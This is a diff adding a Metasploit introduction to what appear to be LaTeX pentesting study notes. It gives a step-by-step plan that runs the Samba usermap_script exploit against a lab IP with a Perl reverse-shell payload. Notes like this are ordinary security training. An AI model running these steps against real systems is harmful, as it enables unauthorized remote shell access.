@@ -569,4 +569,35 @@ Fast, online password-guessing tool used by pentesters to test login services. P
         \end{itemize}
 \end{enumerate}
 
+\part*{8 - Introduction to Metasploit}
+
+\textbf{Metasploit} is an open-source poject used for exploiting security vulnerabilities on host machines.
+
+\bigskip
+
+\textbf{IMPORTANT}: It is crucial to keep Metasploit up to date.
+
+\subsection*{MSFConsole}
+
+\begin{itemize}
+    \item \texttt{sudo msfdb init}: initiate the Metasploit database.
+    \item \texttt{msfconsole}: start the metasploit console
+    \item \texttt{show exploits}: list all commands
+    \item \texttt{search 2007-2447}: search for an exploit
+    \item \texttt{grep usermap search cve-2007}: command line grep
+\end{itemize}
+
+\subsection*{Metasploit Exploitation Plan}
+
+\begin{itemize}
+    \item Find a vulnerability.
+    \item \texttt{use multi/samba/usermap\_script}: use an exploit that exploits vulnerability
+    \item \texttt{show options}, \texttt{set RHOST 172.16.28.161}: set options for the exploit
+    \item \texttt{show payloads}: determine payload to use
+    \item \texttt{set PAYLOAD cmd/unix/reverse\_perl}: set the payload
+    \item \texttt{show advanced}: show even more options
+    \item \texttt{exploit}: run the exploit!
+\end{itemize}
+
+
 \end{document}
